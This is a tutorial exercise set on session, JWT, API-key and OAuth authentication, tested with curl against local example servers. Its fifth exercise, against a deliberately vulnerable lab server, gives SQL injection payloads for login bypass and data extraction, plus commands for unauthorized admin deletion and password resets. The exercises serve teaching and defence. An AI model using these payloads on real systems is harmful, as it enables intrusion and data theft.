# 🏋️ Exercises: Authentication and Authorization

Complete these hands-on exercises to master authentication and authorization concepts.

## 📋 Prerequisites

Before starting, install the required dependencies:

```bash
cd examples
pip install -r requirements.txt
```

---

## Exercise 1: Implement Session-Based Authentication 🎫

**Objective:** Build and test a session-based authentication system.

### Part A: Setup and Basic Testing

1. **Start the session auth server:**
```bash
python examples/01_session_auth.py
```

2. **Register a new user:**
```bash
curl -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"securepass123","email":"alice@example.com"}'
```

**Expected:** `201 Created` with success message

3. **Try to access profile without logging in:**
```bash
curl http://localhost:5000/profile
```

**Expected:** `401 Unauthorized` - Not authenticated

4. **Login and save session cookie:**
```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"securepass123"}' \
  -c cookies.txt -v
```

**Expected:** `200 OK` with login success message. Check the `Set-Cookie` header.

5. **Access profile with session cookie:**
```bash
curl http://localhost:5000/profile -b cookies.txt
```

**Expected:** `200 OK` with user profile data

6. **Update profile:**
```bash
curl -X PUT http://localhost:5000/update-profile \
  -H "Content-Type: application/json" \
  -d '{"email":"alice.updated@example.com"}' \
  -b cookies.txt
```

**Expected:** `200 OK` with update confirmation

7. **Logout:**
```bash
curl -X POST http://localhost:5000/logout -b cookies.txt
```

**Expected:** `200 OK` - Logged out

8. **Try to access profile after logout:**
```bash
curl http://localhost:5000/profile -b cookies.txt
```

**Expected:** `401 Unauthorized` - Session cleared

### Part B: Error Handling

Test these error scenarios:

1. **Register with existing username:**
```bash
curl -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"anotherpass","email":"test@example.com"}'
```

2. **Login with wrong password:**
```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"wrongpassword"}'
```

3. **Register with weak password (less than 8 chars):**
```bash
curl -X POST http://localhost:5000/register \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"weak","email":"bob@example.com"}'
```

### Part C: Understanding Sessions

**Questions to explore:**

1. Open `cookies.txt` and examine the session cookie. What does it contain?
2. Can you decode the session cookie? (Hint: It's signed but not encrypted)
3. What happens if you manually delete the cookie and try to access `/profile`?
4. What happens if you modify the cookie value?

**Challenge:** 
- Register two different users
- Log in as both users in different terminal windows
- Verify each has their own session

---

## Exercise 2: Implement JWT Authentication 🎟️

**Objective:** Build and test JWT-based authentication with refresh tokens.

### Part A: Basic JWT Flow

1. **Start the JWT auth server:**
```bash
python examples/02_jwt_auth.py
```

2. **Register a user:**
```bash
curl -X POST http://localhost:5001/register \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"securepass456","email":"bob@example.com"}'
```

3. **Login and capture tokens:**
```bash
curl -X POST http://localhost:5001/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","password":"securepass456"}' | jq
```

**Save the `access_token` and `refresh_token` from the response.**

4. **Access protected endpoint with token:**
```bash
# Replace <ACCESS_TOKEN> with your actual token
curl http://localhost:5001/profile \
  -H "Authorization: Bearer <ACCESS_TOKEN>"
```

5. **Update profile with JWT:**
```bash
curl -X PUT http://localhost:5001/update-profile \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer <ACCESS_TOKEN>" \
  -d '{"email":"bob.new@example.com"}'
```

### Part B: Token Refresh Flow

1. **Refresh the access token:**
```bash
# Replace <REFRESH_TOKEN> with your refresh token
curl -X POST http://localhost:5001/refresh \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"<REFRESH_TOKEN>"}' | jq
```

**Expected:** New access token

2. **Use the new access token:**
```bash
curl http://localhost:5001/profile \
  -H "Authorization: Bearer <NEW_ACCESS_TOKEN>"
```

### Part C: Token Verification

1. **Verify a valid token:**
```bash
curl -X POST http://localhost:5001/verify-token \
  -H "Content-Type: application/json" \
  -d '{"token":"<ACCESS_TOKEN>"}' | jq
```

2. **Try using an invalid token:**
```bash
curl http://localhost:5001/profile \
  -H "Authorization: Bearer invalid.token.here"
```

3. **Try using a token without Bearer prefix:**
```bash
curl http://localhost:5001/profile \
  -H "Authorization: <ACCESS_TOKEN>"
```

### Part D: Understanding JWT

**Tasks:**

1. **Decode your JWT:** Visit https://jwt.io and paste your access token
   - Examine the header - what algorithm is used?
   - Examine the payload - what claims are included?
   - When does the token expire?

2. **Experiment with expiration:** Edit `02_jwt_auth.py` and change `ACCESS_TOKEN_EXPIRES` to `timedelta(seconds=5)`. Login, wait 6 seconds, then try to use the token.

3. **Logout and revoke refresh token:**
```bash
curl -X POST http://localhost:5001/logout \
  -H "Authorization: Bearer <ACCESS_TOKEN>" \
  -H "Content-Type: application/json" \
  -d '{"refresh_token":"<REFRESH_TOKEN>"}'
```

Then try to refresh with the revoked token.

---

## Exercise 3: API Key Authentication with Rate Limiting 🔑

**Objective:** Implement and test API key authentication with rate limiting.

### Part A: API Key Management

1. **Start the API key server:**
```bash
python examples/03_api_key_auth.py
```

2. **Create an API key:**
```bash
curl -X POST http://localhost:5002/api/keys/create \
  -H "Content-Type: application/json" \
  -d '{"owner":"charlie@example.com","description":"My first API key"}' | jq
```

**Save the `api_key` from the response!**

3. **Check API key information:**
```bash
# Replace <API_KEY> with your actual key
curl http://localhost:5002/api/keys/info \
  -H "X-API-Key: <API_KEY>" | jq
```

4. **Access protected endpoints:**
```bash
curl http://localhost:5002/api/data \
  -H "X-API-Key: <API_KEY>" | jq

curl "http://localhost:5002/api/weather?city=London" \
  -H "X-API-Key: <API_KEY>" | jq
```

### Part B: Rate Limiting Testing

1. **Test rate limiting with a simple loop:**
```bash
# Make 15 requests quickly (limit is 10 per minute)
for i in {1..15}; do
  echo "Request $i:"
  curl http://localhost:5002/api/data \
    -H "X-API-Key: <API_KEY>" \
    -w "\nStatus: %{http_code}\n\n"
  sleep 0.5
done
```

**Expected:** First 10 requests succeed, then you should get `429 Too Many Requests`

2. **Check remaining rate limit:**
```bash
curl http://localhost:5002/api/keys/info \
  -H "X-API-Key: <API_KEY>" | jq '.rate_limit'
```

3. **Wait 60 seconds and try again:**
```bash
sleep 60
curl http://localhost:5002/api/data \
  -H "X-API-Key: <API_KEY>" | jq
```

### Part C: API Key Security

1. **Try accessing without API key:**
```bash
curl http://localhost:5002/api/data
```

**Expected:** `401 Unauthorized`

2. **Try with invalid API key:**
```bash
curl http://localhost:5002/api/data \
  -H "X-API-Key: invalid-key-12345"
```

3. **Revoke your API key:**
```bash
curl -X POST http://localhost:5002/api/keys/revoke \
  -H "X-API-Key: <API_KEY>" | jq
```

4. **Try using revoked key:**
```bash
curl http://localhost:5002/api/data \
  -H "X-API-Key: <API_KEY>"
```

**Expected:** `401 Unauthorized` - Key revoked

---

## Exercise 4: OAuth 2.0 with GitHub 🔓

**Objective:** Understand OAuth flow by implementing GitHub authentication.

### Part A: Setup OAuth Application

1. **Register OAuth app on GitHub:**
   - Go to https://github.com/settings/developers
   - Click "New OAuth App"
   - Fill in:
     - Application name: "Auth Learning App"
     - Homepage URL: http://localhost:5003
     - Authorization callback URL: http://localhost:5003/callback
   - Click "Register application"
   - Copy the Client ID and generate a Client Secret

2. **Set environment variables:**
```bash
export GITHUB_CLIENT_ID='your-client-id-here'
export GITHUB_CLIENT_SECRET='your-client-secret-here'
```

3. **Start the OAuth server:**
```bash
python examples/04_oauth_example.py
```

### Part B: OAuth Flow Testing

1. **Check configuration:**
```bash
curl http://localhost:5003/info | jq
```

2. **Get authorization URL:**
```bash
curl http://localhost:5003/login | jq
```

3. **Complete OAuth flow:**
   - Open browser to http://localhost:5003
   - Click on the authorization URL or navigate to http://localhost:5003/login
   - You'll be redirected to GitHub
   - Authorize the application
   - You'll be redirected back to /callback with user info

4. **Access authenticated endpoints:**
```bash
# After completing OAuth flow in browser, your session is active
curl http://localhost:5003/profile | jq
curl http://localhost:5003/repos | jq
```

### Part C: Understanding OAuth

**Questions:**

1. What permissions (scopes) does the app request?
2. What happens if you deny authorization?
3. Can you access /profile before completing OAuth flow?
4. Where is the GitHub access token stored?

---

## Exercise 5: Security Testing - Exploit Vulnerabilities ⚠️

**Objective:** Learn security by finding and exploiting intentional vulnerabilities.

**⚠️ WARNING:** This server is intentionally vulnerable! Only use for learning.

### Part A: Setup

1. **Start the vulnerable server:**
```bash
python examples/05_vulnerable_auth.py
```

2. **Check vulnerabilities list:**
```bash
curl http://localhost:5004/vulnerabilities | jq
```

### Part B: Exploitation Tasks

**Task 1: Default Credentials**

Try logging in with default credentials:
```bash
curl -X POST http://localhost:5004/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin123"}' | jq
```

Notice what sensitive information is returned!

**Task 2: SQL Injection - Bypass Authentication**

Exploit SQL injection to login without a password:
```bash
curl -X POST http://localhost:5004/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}' | jq
```

Alternative payloads to try:
- `admin' --`
- `' OR 1=1 --`
- `admin' OR '1'='1`

**Task 3: Information Disclosure**

1. **List all users (no auth required!):**
```bash
curl http://localhost:5004/users | jq
```

Notice: Passwords are in plaintext!

2. **Check debug endpoint:**
```bash
curl http://localhost:5004/debug/sessions | jq
```

**Task 4: Privilege Escalation**

1. **Register as regular user:**
```bash
curl -X POST http://localhost:5004/register \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123"}' | jq
```

2. **Login:**
```bash
curl -X POST http://localhost:5004/login \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"password123"}' \
  -c vuln_cookies.txt | jq
```

3. **Delete admin user (no authorization check!):**
```bash
curl -X POST http://localhost:5004/admin/delete-user \
  -H "Content-Type: application/json" \
  -d '{"username":"admin"}' \
  -b vuln_cookies.txt | jq
```

**Task 5: Insecure Password Reset**

Reset anyone's password without verification:
```bash
curl -X POST http://localhost:5004/reset-password \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","new_password":"hacked123"}' | jq
```

**Task 6: SQL Injection - Data Extraction**

Extract all users using SQL injection:
```bash
curl -X POST http://localhost:5004/login \
  -H "Content-Type: application/json" \
  -d '{"username":"' UNION SELECT * FROM users --","password":"x"}' | jq
```

### Part C: Write a Security Report

For each vulnerability you exploited:

1. **Name:** What is the vulnerability called?
2. **Location:** Which endpoint(s) are affected?
3. **Exploitation:** How did you exploit it?
4. **Impact:** What damage could this cause?
5. **Fix:** How should it be fixed?

**Example Report Structure:**

```markdown
## Vulnerability: SQL Injection in Login

**Location:** POST /login

**Description:** User input is directly concatenated into SQL query without sanitization.

**Exploitation:**
- Username: admin' OR '1'='1' --
- Password: anything
- Result: Bypassed authentication

**Impact:** 
- Attackers can bypass authentication
- Extract all database data
- Modify or delete records

**Fix:**
- Use parameterized queries
- Never concatenate user input into SQL
- Example: c.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
```

---

## Exercise 6: Testing with Postman 📮

**Objective:** Create and use Postman collections for authentication testing.

### Part A: Session Authentication Collection

1. **Import or create collection for session auth**
2. **Create requests:**
   - Register User
   - Login (save cookies automatically)
   - Get Profile
   - Update Profile
   - Logout

3. **Use Postman Tests:**
```javascript
// Add to Login request tests
pm.test("Status code is 200", function () {
    pm.response.to.have.status(200);
});

pm.test("Response has session cookie", function () {
    pm.expect(pm.cookies.has('session')).to.be.true;
});
```

### Part B: JWT Authentication Collection

1. **Create requests for JWT auth**
2. **Use Postman environment variables:**
```javascript
// In Login request tests:
var jsonData = pm.response.json();
pm.environment.set("access_token", jsonData.access_token);
pm.environment.set("refresh_token", jsonData.refresh_token);
```

3. **Use token in subsequent requests:**
   - In Authorization tab: Bearer Token
   - Token: `{{access_token}}`

### Part C: Automated Testing

Create a test suite that:
1. Registers a user
2. Logs in
3. Accesses protected resource
4. Refreshes token
5. Accesses resource with new token
6. Logs out

Run the entire collection and verify all tests pass.

---

## Exercise 7: Build Your Own Authentication 🏗️

**Objective:** Apply what you've learned by building authentication for a real app.

### Requirements:

Build a simple TODO API with authentication:

**Endpoints:**
- `POST /auth/register` - Register new user
- `POST /auth/login` - Login
- `GET /todos` - Get user's todos (auth required)
- `POST /todos` - Create todo (auth required)
- `PUT /todos/:id` - Update todo (auth required)
- `DELETE /todos/:id` - Delete todo (auth required)

**Security Requirements:**
1. ✅ Passwords must be hashed with bcrypt
2. ✅ Use JWT for authentication
3. ✅ Implement refresh tokens
4. ✅ Users can only access their own todos
5. ✅ Validate all input
6. ✅ Return appropriate error codes
7. ✅ No SQL injection vulnerabilities
8. ✅ Rate limit login endpoint

**Bonus:**
- Add email verification
- Implement password reset
- Add OAuth login option
- Add two-factor authentication (2FA)

---

## 📊 Solutions and Hints

<details>
<summary>Hint: SQL Injection Basics</summary>

SQL injection works by breaking out of the intended query structure:

```sql
-- Normal query:
SELECT * FROM users WHERE username='admin' AND password='pass123'

-- Injected (username = admin' OR '1'='1' --):
SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'

-- Everything after -- is a comment, and '1'='1' is always true
```
</details>

<details>
<summary>Hint: JWT Structure</summary>

A JWT has three parts:
- Header: Algorithm and token type
- Payload: User data and claims
- Signature: Verification hash

You can decode (but not modify without detection) on jwt.io
</details>

<details>
<summary>Hint: Testing Rate Limits</summary>

Use a loop to quickly make multiple requests:
```bash
for i in {1..15}; do curl -H "X-API-Key: $KEY" http://localhost:5002/api/data; done
```
</details>

---

## ✅ Completion Checklist

Track your progress:

- [ ] Exercise 1: Session authentication tested
- [ ] Exercise 2: JWT authentication and refresh flow working
- [ ] Exercise 3: API key and rate limiting tested
- [ ] Exercise 4: OAuth flow completed
- [ ] Exercise 5: At least 3 vulnerabilities exploited
- [ ] Exercise 6: Postman collection created
- [ ] Exercise 7: Custom auth implementation started

---

## 🎓 Key Takeaways

After completing these exercises, you should understand:

✅ How session-based authentication works with cookies  
✅ How JWT tokens provide stateless authentication  
✅ How API keys identify and rate-limit clients  
✅ How OAuth 2.0 enables delegated authorization  
✅ Common authentication vulnerabilities and how to prevent them  
✅ Best practices for secure authentication  
✅ How to test authentication systems

---

## 📚 Additional Challenges

1. **Compare Performance:** Benchmark session vs JWT auth. Which is faster?

2. **Security Audit:** Review the code examples and create a security checklist

3. **Add Features:** Extend the examples with:
   - Email verification
   - Password strength meter
   - Two-factor authentication
   - Remember me functionality
   - Account lockout after failed attempts

4. **Real-World Integration:** Integrate authentication into a real project

---

[← Back to Lesson](./README.md)
